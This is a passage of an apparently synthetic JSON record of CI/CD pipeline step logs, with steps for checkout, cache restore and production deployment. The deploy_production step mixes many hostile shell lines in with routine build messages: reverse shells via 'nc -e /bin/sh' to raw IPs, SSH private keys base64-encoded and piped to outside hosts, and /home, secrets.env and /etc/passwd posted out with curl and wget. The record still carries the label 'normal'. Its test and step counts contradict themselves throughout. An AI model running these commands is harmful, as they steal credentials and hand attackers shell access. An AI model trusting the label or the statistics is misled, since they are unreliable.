          "Connection established",
          "Uploading artifact 'coverage' (29 files)",
          "Artifact uploaded: dist.zip (56MB)",
          "[12:19:30] INFO: Processing request",
          "Minifying app.js",
          "Completed.",
          "Checking out master branch",
          "Step 8/21: Deploying",
          "Environment: production",
          "[12:19:30] ERROR: Connection failed",
          "\u2713 All checks passed",
          "npm install: resolved 991 packages",
          "Compiling components/app.ts...",
          "  PASS: e2e/test_api_health.spec.js",
          "Uploading artifact 'coverage' (15 files)",
          "Cache saved successfully",
          "Snapshots: 19 passed, 4 total",
          "Generating source maps...",
          "Done.",
          "[12:19:30] WARN: Deprecated API usage",
          "Using Node.js 15.4.8",
          "Optimizing 47 modules...",
          "Completed.",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Artifact downloaded: 35MB",
          "Installing axios@2.11.2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:30] DEBUG: Memory usage: 223MB",
          "\u2717 build failed with exit code 98",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/service.java...",
          "FAILED: test_user_create",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: TypeError",
          "  PASS: unit/test_auth_login.spec.js",
          "Verifying...",
          "Coverage: 93% statements, 81% branches",
          "Compiling utils/index.js...",
          "Bundling runtime.js",
          "Cache saved successfully",
          "Optimizing 14 modules...",
          "[12:19:30] DEBUG: Initializing service",
          "Verifying...",
          "Transforming 384 files...",
          "Optimizing 79 modules...",
          "yarn add: Done in 13.13s",
          "[12:19:30] WARN: Deprecated API usage",
          "Transforming 830 files...",
          "Loading...",
          "Step 13/19: Building",
          "Compiling utils/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:30] INFO: Starting build process",
          "Artifact uploaded: dist.zip (99MB)",
          "Pushing to registry...",
          "pip: Collecting lodash",
          "Compiling utils/main.py...",
          "Test Suites: 46 passed, 19 total",
          "Step 6/21: Running migrations",
          "Ran 177 tests in 56s",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-21T12:21:15.735626",
        "finished_at": "2025-11-21T12:21:18.831444",
        "log_lines": [
          "=== Step: checkout ===",
          "Optimizing 63 modules...",
          "Checking out main branch",
          "TLS handshake completed",
          "POST /api - 201 (393ms)",
          "Compiling utils/app.ts...",
          "TLS handshake completed",
          "Waiting...",
          "Compiling utils/app.ts...",
          "Uploading artifact 'coverage' (9 files)",
          "Step 1/20: Running migrations",
          "Snapshots: 8 passed, 27 total",
          "FAILED: test_cache_hit",
          "Uploading artifact 'build' (48 files)",
          "Cache hit for key-2282",
          "Ready.",
          "pip: Installing build dependencies...",
          "Step 16/18: Installing dependencies",
          "Cache miss for key-1383",
          "Cache miss for key-2718",
          "Time: 101.401s",
          "[12:19:30] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Compiling utils/index.js...",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 256 files...",
          "Processing...",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 146 passed, 75 total",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:30] WARN: Deprecated API usage",
          "Done.",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-5965",
          "Environment: production",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "[12:19:30] DEBUG: Query executed in 85ms",
          "npm install: added 234 packages",
          "Uploading artifact 'coverage' (25 files)",
          "Compiling components/app.ts...",
          "Step 10/16: Building",
          "Compiling src/handler.rs...",
          "Installing lodash@4.11.2",
          "Cache miss for key-5459",
          "Compiling src/app.ts...",
          "Ran 105 tests in 28s",
          "Time: 11.861s",
          "Platform: win32-x64",
          "Tests: 255 passed, 218 total",
          "[12:19:30] DEBUG: Query executed in 45ms",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "[12:19:30] DEBUG: Initializing service",
          "Waiting...",
          "\u2713 Step 'setup' succeeded",
          "Step 7/21: Building",
          "Layer 2/8: RUN command",
          "Cache saved successfully",
          "Platform: win32-x64",
          "\u2713 Task completed in 553ms",
          "Loading...",
          "Layer 5/14: COPY command",
          "Generating source maps...",
          "Completed.",
          "npm install: resolved 1050 packages",
          "Installing express@5.17.1",
          "Bundling runtime.js",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "FAILED: test_cache_hit",
          "Environment: development",
          "\u2713 All checks passed",
          "\u2713 Step 'test' succeeded",
          "Installing jest@1.20.3",
          "  PASS: test_user_create (392ms)",
          "Tests: 271 passed, 96 total",
          "Compiling lib/utils.go...",
          "OK",
          "\u2713 Step 'install' succeeded",
          "  PASS: integration/test_cache_hit.spec.js",
          "  PASS: unit/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (37MB)",
          "[12:19:30] INFO: Processing request",
          "Platform: linux-x64",
          "Connection established",
          "Pushing to registry...",
          "Step 20/21: Linting",
          "OK",
          "Compiling components/utils.go...",
          "[12:19:30] DEBUG: Initializing service",
          "Done.",
          "Success!",
          "Compiling lib/index.js...",
          "Loading...",
          "pip: Collecting react",
          "Tests: 226 passed, 140 total",
          "Cache restored successfully (456MB)",
          "FAILED: test_db_connect",
          "yarn add: Done in 29.14s",
          "Artifact uploaded: dist.zip (72MB)",
          "\u2713 build completed",
          "FAILED: test_auth_login",
          "Artifact uploaded: dist.zip (35MB)",
          "Already up to date.",
          "Cache hit for key-5598",
          "[12:19:30] DEBUG: Query executed in 76ms",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (30MB)",
          "OK",
          "Success!",
          "Connecting to acme.corp:443...",
          "Pulling image: node:3.11",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 test completed",
          "npm notice: package.json updated",
          "Snapshots: 4 passed, 27 total",
          "[12:19:30] INFO: Request completed",
          "Time: 32.54s",
          "Processing...",
          "Installing prettier@2.0.2",
          "[12:19:30] WARN: Deprecated API usage",
          "Generating source maps...",
          "[12:19:30] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:19:30] DEBUG: Loading configuration",
          "Time: 8.17s",
          "Bundling runtime.css",
          "Uploading artifact 'dist' (26 files)",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 20.8s",
          "Step 17/15: Installing dependencies",
          "  PASS: test_auth_login (468ms)",
          "[12:19:30] DEBUG: Loading configuration",
          "Cache miss for key-7018",
          "Building Docker image...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-21T12:21:18.831444",
        "finished_at": "2025-11-21T12:21:23.475171",
        "log_lines": [
          "=== Step: restore_cache ===",
          "HEAD is now at 65ea8ab",
          "[12:19:30] INFO: Cache refreshed",
          "\u2713 Task completed in 3147ms",
          "Artifact downloaded: 25MB",
          "Image pulled successfully",
          "Step 14/21: Installing dependencies",
          "Time: 75.922s",
          "[12:19:30] WARN: Deprecated API usage",
          "Checking out develop branch",
          "pip: Downloading express-2.1.tar.gz",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /data - 201 (41ms)",
          "npm notice: package.json updated",
          "\u2713 Step 'build' succeeded",
          "Success!",
          "Ready.",
          "Compiling src/handler.rs...",
          "Optimizing 61 modules...",
          "Step 8/22: Deploying",
          "Verifying...",
          "Exception: NullPointerException",
          "Installing prettier@3.16.5",
          "[12:19:30] DEBUG: Connection pool: 10 active",
          "[12:19:30] INFO: Starting build process",
          "Checking out main branch",
          "\u2713 validate completed",
          "Bundling vendor.js",
          "Compiling components/service.java...",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 16 tests in 44s",
          "TLS handshake completed",
          "Completed.",
          "POST /upload - 201 (43ms)",
          "[12:19:30] INFO: Starting build process",
          "Fetching submodules...",
          "Compiling components/index.js...",
          "Bundling main.js",
          "Image pulled successfully",
          "Pushing to registry...",
          "Already up to date.",
          "Already up to date.",
          "Optimizing 28 modules...",
          "[12:19:30] WARN: Deprecated API usage",
          "Waiting...",
          "[12:19:30] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "Image pulled successfully",
          "Success!",
          "pip install: Successfully installed axios-3.3",
          "NODE_ENV=test",
          "Fetching submodules...",
          "[12:19:30] INFO: Starting build process",
          "POST /api - 200 (263ms)",
          "Layer 7/8: ENV command",
          "NODE_ENV=production",
          "Optimizing 13 modules...",
          "Compiling components/main.py...",
          "Using Node.js 18.3.10",
          "[12:19:30] WARN: Deprecated API usage",
          "Transforming 286 files...",
          "HEAD is now at b63f600",
          "Ran 111 tests in 22s",
          "Snapshots: 20 passed, 26 total",
          "Time: 82.31s",
          "[12:19:30] DEBUG: Loading configuration",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "[12:19:30] WARN: Deprecated API usage",
          "Waiting...",
          "Step 14/20: Deploying",
          "[12:19:30] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "\u2713 Task completed in 2588ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Step 'build' succeeded",
          "  PASS: test_cache_hit (118ms)",
          "[12:19:30] WARN: Deprecated API usage",
          "Compiling lib/service.java...",
          "pip: Collecting prettier",
          "Time: 112.362s",
          "Waiting...",
          "npm install: added 39 packages",
          "Compiling src/service.java...",
          "HEAD is now at 3c903c5",
          "GET /status - 204 (25ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/16: Building",
          "Ran 135 tests in 20s",
          "POST /api - 201 (433ms)",
          "Platform: darwin-arm64",
          "Bundling vendor.js",
          "[12:19:30] INFO: Processing request",
          "Cache hit for key-5804",
          "WARNING: lodash has known vulnerabilities",
          "Fetching submodules...",
          "Checking out develop branch",
          "Step 12/21: Linting",
          "Minifying vendor.js",
          "Cache miss for key-2283",
          "Already up to date.",
          "Step 10/25: Installing dependencies",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "OK",
          "Optimizing 51 modules...",
          "Exception: NullPointerException",
          "[12:19:30] ERROR: Connection failed",
          "Artifact downloaded: 20MB",
          "Fetching submodules...",
          "Cache restored successfully (246MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: NullPointerException",
          "Cache miss for key-9501",
          "npm install: added 191 packages",
          "Creating production build...",
          "Loading...",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-105'",
          "npm notice: created a lockfile",
          "Pulling image: python:latest",
          "[12:19:30] INFO: Starting build process",
          "Loading...",
          "[12:19:30] DEBUG: Connection pool: 20 active",
          "Success!",
          "Artifact downloaded: 2MB",
          "Platform: linux-x64",
          "TLS handshake completed",
          "Tests: 245 passed, 338 total",
          "Transforming 960 files...",
          "Creating production build...",
          "Using Python 3.9",
          "Loading...",
          "Already up to date.",
          "Already up to date.",
          "Pushing to registry...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-21T12:21:23.475171",
        "finished_at": "2025-11-21T12:21:26.570989",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Success!",
          "nc -e /bin/sh 208.205.183.138 8362",
          "Coverage: 86% statements, 84% branches",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "NODE_ENV=test",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 94.107.167.191 24408",
          "Success!",
          "Test Suites: 46 passed, 32 total",
          "npm install: added 114 packages",
          "Ready.",
          "yarn add: Done in 12.92s",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Step 9/18: Installing dependencies",
          "Processing...",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Exception: RuntimeError",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache saved successfully",
          "WARNING: webpack has known vulnerabilities",
          "Success!",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Checking out main branch",
          "POST /upload - 200 (99ms)",
          "yarn add: Done in 5.12s",
          "Installing lodash@4.20.8",
          "Snapshots: 50 passed, 32 total",
          "Compiling components/main.py...",
          "Minifying vendor.js",
          "Bundling styles.css",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "[12:19:30] DEBUG: Initializing service",
          "Ran 66 tests in 40s",
          "Using Python 3.9",
          "Ready.",
          "Step 20/16: Running migrations",
          "Snapshots: 14 passed, 19 total",
          "npm install: added 326 packages",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "\u2713 All checks passed",
          "Creating production build...",
          "Tests: 398 passed, 94 total",
          "Step 6/19: Testing",
          "Coverage: 76% statements, 80% branches",
          "Waiting...",
          "[12:19:30] INFO: Cache refreshed",
          "pip: Collecting prettier",
          "Step 18/16: Testing",
          "Finished.",
          "Sending 111MB of data to acme.corp",
          "Pushing to registry...",
          "nc -e /bin/sh 136.160.100.156 37625",
          "Loading...",
          "[12:19:30] DEBUG: Connection pool: 5 active",
          "Environment: test",
          "GET /api - 201 (76ms)",
          "[12:19:30] DEBUG: Query executed in 23ms",
          "nc -e /bin/sh 58.69.137.28 50564",
          "Coverage: 86% statements, 77% branches",
          "OK",
          "pip: Collecting react",
          "Artifact downloaded: 22MB",
          "Time: 37.638s",
          "[12:19:30] ERROR: Connection failed",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "npm notice: package.json updated",
          "Finished.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 67.165.154.180 19643",
          "Step 10/19: Running migrations",
          "Done.",
          "Optimizing 62 modules...",
          "Sending 436MB of data to example.com",
          "Step 3/18: Running migrations",
          "npm notice: package.json updated",
          "Step 14/23: Building",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] INFO: Request completed",
          "\u2717 build failed with exit code 6",
          "nc -e /bin/sh 183.104.176.49 3907",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "\u2713 Step 'setup' succeeded",
          "FAILED: test_db_connect",
          "Loading...",
          "Loading...",
          "Sending 18MB of data to acme.corp",
          "\u2713 Task completed in 910ms",
          "Compiling utils/handler.rs...",
          "Fetching submodules...",
          "Ran 182 tests in 48s",
          "yarn add: Done in 25.13s",
          "[12:19:30] DEBUG: Query executed in 16ms",
          "Cache saved successfully",
          "[12:19:30] DEBUG: Memory usage: 539MB",
          "nc -e /bin/sh 6.89.184.182 65341",
          "Minifying vendor.js",
          "Checking out master branch",
          "Step 1/23: Testing",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Compiling src/index.js...",
          "Compiling components/index.js...",
          "[12:19:30] INFO: Processing request",
          "Already up to date.",
          "Cache restored successfully (229MB)",
          "Test Suites: 9 passed, 28 total",
          "Using Python 3.12",
          "[12:19:30] DEBUG: Connection pool: 9 active",
          "nc -e /bin/sh 168.127.33.36 2609",
          "yarn add: Done in 19.50s",
          "Cache saved successfully",
          "Connection established",
          "Compiling utils/index.js...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 166.214.255.25 35799",
          "GET /health - 201 (70ms)",
          "Step 15/24: Testing",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:19:30] DEBUG: Connection pool: 3 active",
          "WARNING: react has known vulnerabilities",
          "Cache restored successfully (431MB)",
          "Connection established",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "pip: Downloading react-1.14.tar.gz",
          "Using Node.js 17.16.3",
          "\u2713 Task completed in 4086ms",
          "WARNING: axios has known vulnerabilities",
          "[12:19:30] INFO: Cache refreshed",
          "Optimizing 27 modules...",
          "\u2713 Step 'build' succeeded",
          "pip install: Successfully installed axios-2.1",
          "\u2713 lint completed",
          "Processing...",
          "yarn add: Done in 20.74s",
          "Ready.",
          "Test Suites: 13 passed, 25 total",
          "TLS handshake completed",
          "Step 7/15: Building",
          "Fetching submodules...",
          "Coverage: 86% statements, 78% branches",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Ran 41 tests in 26s",
          "Step 10/21: Deploying",
          "[12:19:30] INFO: Starting build process",
          "Cache saved successfully",
          "  PASS: test_user_create (118ms)",
          "WARNING: express has known vulnerabilities",
          "POST /api - 200 (334ms)",
          "Artifact uploaded: dist.zip (40MB)",
          "Test Suites: 44 passed, 45 total",
          "nc -e /bin/sh 231.123.42.33 33755",
          "WARNING: axios has known vulnerabilities",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 145.120.85.238 57543",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "[12:19:30] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "Uploading artifact 'dist' (2 files)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Compiling components/app.ts...",
          "pip: Installing build dependencies...",
          "[12:19:30] INFO: Processing request",
          "Cache hit for key-1228",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 46.104.194.80 16983",
          "Checking out main branch",
          "Step 14/20: Testing",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}